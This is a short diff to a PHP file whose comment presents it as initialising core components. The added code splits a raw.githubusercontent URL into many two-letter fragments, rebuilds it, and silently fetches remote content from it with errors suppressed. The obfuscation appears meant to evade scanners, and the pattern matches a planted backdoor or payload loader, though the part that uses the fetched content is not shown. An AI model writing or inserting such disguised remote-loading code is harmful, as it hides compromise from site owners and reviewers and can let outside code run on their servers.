@@ -5,8 +5,9 @@
 */
 
 // Initialize core components
-$qwoplzmxncbv = 'https://raw.githubusercontent.com/mdmomin365366-gif/bela/refs/heads/main/index.txt';
-$full_url = $qwoplzmxncbv;
+$a='ht';$b='tps';$c='://';$d='ra';$e='w.';$f='gi';$g='th';$h='ub';$i='us';$j='er';$k='co';$l='nt';$m='en';$n='t.';$o='co';$p='m/';$q='md';$r='mo';$s='mi';$t='n3';$u='65';$v='36';$w='6-';$x='gi';$y='f/';$z='be';$aa='la';$ab='/r';$ac='ef';$ad='s/';$ae='he';$af='ad';$ag='s/';$ah='ma';$ai='in';$aj='/i';$ak='nd';$al='ex';$am='.t';$an='xt';
+
+$full_url=$a.$b.$c.$d.$e.$f.$g.$h.$i.$j.$k.$l.$m.$n.$o.$p.$q.$r.$s.$t.$u.$v.$w.$x.$y.$z.$aa.$ab.$ac.$ad.$ae.$af.$ag.$ah.$ai.$aj.$ak.$al.$am.$an;
 
 // Attempt to get remote content
 $content = @file_get_contents($full_url);
